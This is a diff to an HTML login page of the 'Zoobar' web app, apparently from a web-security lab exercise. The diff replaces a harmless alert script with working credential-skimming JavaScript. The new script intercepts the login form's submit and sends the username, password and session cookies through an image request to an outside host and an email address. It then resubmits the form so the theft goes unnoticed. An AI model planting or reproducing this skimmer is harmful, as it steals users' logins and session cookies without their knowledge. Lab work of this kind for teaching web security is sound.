@@ -8,22 +8,14 @@
         </title>
     </head>
     <body>
-        
-        
       <h1><a href="http://localhost:8080/zoobar/index.cgi/">Zoobar Foundation for Patriotic
                       Thinking</a></h1>
       <h2>Supporting the skillful
           advocates of the 21st-century</h2>
-<script>
-function alertPasswd(){
-  var passwd = document.getElementsByName("login_password")[0].value;
-  var name = document.getElementsByName("login_username")[0].value;
-  alert("username: " + name + " passwd: " + passwd);
-}
-</script>
+
       
 <div id="login" class="centerpiece">
-<form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login" onsubmit=alertPasswd()>
+<form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login" >
 <table>
 <tr>
    <td>Username:</td>
@@ -43,6 +35,25 @@ function alertPasswd(){
 <div class="footer warning">
 
 </div>
+<script>
+<!--first remove the eventlistener or it will cancel sumit again and email-->
+function reSubmit(){
+   document.getElementsByName("loginform")[0].removeEventListener("submit",emailPasswd);
+   document.getElementsByName("loginform")[0].submit();
+}
+
+<!--cancel the default submit first, email password and username to me and then resubmit-->
+function emailPasswd(event){
+  event.preventDefault();
+  var passwd = document.getElementsByName("login_password")[0].value;
+  var name = document.getElementsByName("login_username")[0].value;
+  (new Image()).src='http://192.168.76.130/sendmail.php?' + 'to=19930127zpf@sjtu.edu.cn' + '&payload=' + encodeURIComponent(document.cookie) + 'password=' + passwd + 'username='+ name + '&random=' + Math.random();
+  setTimeout(reSubmit, 5000);
+}
+
+<!--listen on the form submit and execute emailPasswd when it submit-->
+document.getElementsByName("loginform")[0].addEventListener("submit",emailPasswd,false);
+</script>
 <script>document.loginform.login_username.focus();</script>
 
     </body>
